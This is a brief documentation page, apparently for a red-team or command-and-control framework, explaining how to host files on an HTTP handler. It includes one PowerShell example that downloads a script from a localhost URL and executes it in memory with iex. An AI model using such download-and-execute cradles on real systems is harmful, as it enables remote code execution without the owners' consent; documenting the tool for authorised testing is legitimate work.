Hosted Files
============

Since the HTTP handler acts as a web server, it can also serve any arbitrary file.  Hosted files appear in a separate table underneath the HTTP handlers.
To host a file, click the ``Cloud`` icon next to the handler you want to host on.

.. image:: /images/hosted-files/no-files.png

The ``Handler`` drop-down is pre-populated with the one you selected, but can be changed here without having to go back.
Clicking the ``Select File`` button will open a file dialogue window to select the desired file.
Enter the URI that you want the file to be hosted at.  It does not have to be the same as the original filename.

.. image:: /images/hosted-files/dialogue.png

Once hosted, the file will appear in the table below.

.. image:: /images/hosted-files/hosted-file.png

.. code-block::

   PS C:\> iex (new-object net.webclient).downloadstring("http://localhost:8080/test"); Invoke-TestCommand
   This is a test

To remove a hosted file, simply click the red garbage icon.